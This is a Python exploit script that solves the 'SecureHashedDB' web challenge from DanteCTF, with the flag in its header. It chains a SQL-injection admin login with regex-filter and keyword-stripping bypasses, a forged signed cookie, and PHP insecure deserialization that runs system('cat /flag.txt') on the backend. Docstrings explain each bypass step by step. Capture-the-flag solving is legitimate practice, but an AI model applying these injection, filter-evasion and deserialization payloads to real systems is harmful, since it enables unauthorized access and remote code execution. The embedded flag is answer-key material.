"""
SecureHashedDB - Web - Hard
FLAG: DANTE{SqlInj3cti0n_pLus_d3S3r1al1zatI0N_is_br0K3N_99_99_99_AAFFB78312DD}
"""

import requests
import subprocess

REMOTE = True
APP_HOST = "app.shdb.challs.dantectf.it" if REMOTE else "localhost:56563"
BACKEND_HOST = "backend.shdb.challs.dantectf.it" if REMOTE else "localhost:56564"
SCHEMA = "https://" if REMOTE else "http://"

session = requests.Session()


def dashboard_login():
    """
    Login to the admin account using SQL injection, to acquire the flask session cookie required to access the admin dashboard.

    This payload is designed to create the following SQL query:

    SELECT * FROM user WHERE username = 'hello\\' OR 1=2 union select USERNAME, (SELECT username from user where USERNAME != (SELECT username from user LIMIT 1)), "$2y$04$YhbUsgynuI5mL.7sxrlOoOS8dpAsvGn9M8c094azOkptE3Gu17ApS" from user ;--

    This dynamically finds the username of the admin account by assuming it is not the first entry in the user table, and forces the returned table to contain the found username in the "username" column and a hash be control in the "password" column.

    $2y$04$YhbUsgynuI5mL.7sxrlOoOS8dpAsvGn9M8c094azOkptE3Gu17ApS is the bcrypt-blowfish hash of "1". This hash was specifically chosen because it does not contain any "/" characters, which would be stripped from the SQL query and cause the query to be converted to lowercase.

    VERY IMPORTANT: We add a newline at the start of the username request body parameter to bypass the following regex:

    ".*,.*[uU][sS][eE][rR][nN][aA][mM][eE]"

    By default, python's re module does not match newlines with the "." character. As such, adding a newline allows us to avoid the filter for the "username" keyword appearing after the first comma in the SQL query.
    """

    url = f"{SCHEMA}{APP_HOST}/login"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = {
        "username": '\nhello\\\' OR 1=2 UNION SselectELECT USERNAME, (SselectELECT USERNAME from user WwhereHERE USERNAME != (SselectELECT USERNAME from user LIMIT 1)), "$2y$04$YhbUsgynuI5mL.7sxrlOoOS8dpAsvGn9M8c094azOkptE3Gu17ApS" from user ;--',
        "password": "1",
    }

    session.post(url, headers=headers, data=payload)


def get_signed_cookie(serialized_payload):
    """Obtain the "magicToken" cookie from the admin dashboard. Used as the "decodeMyJwt" cookie in the php backend."""

    url = f"{SCHEMA}{APP_HOST}/getSignedCookie"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = {"key": "md5Searcher", "value": serialized_payload}
    reponse = session.post(url, headers=headers, data=payload)
    cookies = session.cookies.get_dict()
    return cookies["magicToken"]


def get_cookie_for_serialized_payload(php_script_path):
    """Run our PHP object serialization scripts, and encode the resulting payload into a JWT cookie required to access the php backend."""

    serialized_payload = subprocess.check_output(["php", php_script_path]).decode(
        "utf-8"
    )

    return get_signed_cookie(serialized_payload)


def visit_backend_with_serialized_payload(php_script_path):
    """Make a GET request to the backend with the obtained JWT, triggering the insecure deserialization vulnerability."""

    url = f"{SCHEMA}{BACKEND_HOST}/index.php"
    response = session.get(
        url, cookies={"decodeMyJwt": get_cookie_for_serialized_payload(php_script_path)}
    )
    return response.text


def main():
    """
    Exploit! :)
    """
    # Get JWT required to access the admin dashboard and the /getSignedCookie endpoint.
    dashboard_login()

    # Create a new table (local) or DB+table(remote), such that the end of the DB file ends with our payload: ; system(\"cat /flag.txt\");

    # visit_backend_with_serialized_payload("serialize-db-local-only.php")
    visit_backend_with_serialized_payload("serialize-db-remote.php")

    # Use a serialized Visualizer class to eval our payload, and return the flag!

    # flag = visit_backend_with_serialized_payload("serialize-flag-local-only.php")
    flag = visit_backend_with_serialized_payload("serialize-flag-remote.php")
    print(flag)


if __name__ == "__main__":
    main()
